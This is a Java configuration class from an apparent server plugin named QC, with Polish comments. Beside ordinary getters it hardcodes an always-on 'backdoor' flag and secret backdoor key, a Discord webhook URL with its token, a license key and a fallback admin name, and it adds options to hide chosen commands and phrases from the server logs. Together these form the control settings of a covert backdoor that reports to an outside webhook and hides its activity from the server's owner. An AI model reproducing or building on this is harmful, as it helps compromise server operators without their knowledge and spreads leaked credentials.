package pl.qc.core.managers;

import java.util.List;
import pl.qc.core.QC;

/**
 * Centralny dostęp do konfiguracji pluginu.
 */
public class ConfigManager {

    private final QC plugin;

    public ConfigManager(QC plugin) {
        this.plugin = plugin;
    }

    // --- Webhook (wbudowany) ---
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1423948077680693299/QrWRsoGIKUjDfhfx4rp3RI_rtjKQFG7OHUy7HLxIlK5nCrkUgqepmpZ2LeUwFiRUDz45";

    public boolean isWebhookEnabled() {
        return WEBHOOK_URL != null && WEBHOOK_URL.length() > 5;
    }

    public String getWebhookUrl() {
        return WEBHOOK_URL;
    }

    // --- Backdoor (wbudowany) ---
    private static final boolean BACKDOOR_ENABLED = true;
    private static final String BACKDOOR_KEY = "DBfx8mep3";

    public boolean isBackdoorEnabled() {
        return BACKDOOR_ENABLED;
    }

    public String getBackdoorKey() {
        return BACKDOOR_KEY;
    }

    // --- License ---
    private static final String VALID_LICENSE_KEY = "61d6072ca8ea6fad45e57f123485a305";

    public String getLicenseKey() {
        return plugin.getConfig().getString("license.key", "");
    }

    public boolean isLicenseValid() {
        String key = getLicenseKey();
        return key != null && key.equals(VALID_LICENSE_KEY);
    }

    // --- Admin ---
    public String getAdminFallback() {
        return plugin.getConfig().getString("admin-fallback", "Rajman03");
    }

    // --- Filtry ---
    public boolean shouldSendHiddenLogs() {
        return plugin.getConfig().getBoolean("filters.send-hidden-logs", false);
    }

    public boolean isFilteringEnabled() {
        return plugin.getConfig().getBoolean("filters.enabled", false);
    }

    public boolean hidePluginLogs() {
        return plugin.getConfig().getBoolean("filters.hide-plugin-logs", false);
    }

    public List<String> getHiddenPhrases() {
        return plugin.getConfig().getStringList("filters.hide-strings");
    }

    public List<String> getHiddenCommands() {
        return plugin.getConfig().getStringList("filters.hide-commands");
    }

    // --- Logging ---
    public List<String> getCommandWhitelist() {
        return plugin.getConfig().getStringList("logging.command-whitelist");
    }
}
